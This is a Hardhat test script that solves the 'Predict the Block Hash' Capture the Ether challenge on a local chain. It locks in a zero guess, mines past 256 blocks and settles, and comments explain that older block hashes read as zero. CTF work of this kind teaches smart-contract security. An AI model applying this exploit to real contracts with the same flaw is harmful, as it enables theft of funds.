const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Predict the future", function () {
  const ONE_ETH = ethers.utils.parseEther("1");

  it("Solve the challenge", async () => {
    [deployer] = await ethers.getSigners();

    const challengeFactory = await ethers.getContractFactory(
      "contracts/Lotteries/PredictTheBlockHashChallenge.sol:PredictTheBlockHashChallenge"
    );
    this.challengeContract = await challengeFactory.deploy({ value: ONE_ETH });

    const lockInGuessTx = await this.challengeContract.lockInGuess("0x0000000000000000000000000000000000000000000000000000000000000000", {
      value: ONE_ETH,
    });
    await lockInGuessTx.wait();

    const blockNumber = await ethers.provider.getBlockNumber();

    let lastBlockNumber = blockNumber;

    do {
      lastBlockNumber = await ethers.provider.getBlockNumber();
      console.log(`Block Number: ${lastBlockNumber}`);

      await ethers.provider.send("evm_mine", []);
    } while (lastBlockNumber - blockNumber < 256);

    const attackTx = await this.challengeContract.settle();
    await attackTx.wait();

    expect(await this.challengeContract.isComplete()).to.be.eq(true);
  });
});

// The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero.

// This means that after 256 + 1 blocks of locking our guess our "random" answer will be 0. So we can exploit it:

// Call lockInGuess with 0x0000000000000000000000000000000000000000000000000000000000000000
// Wait for 257 blocks
// Call settle
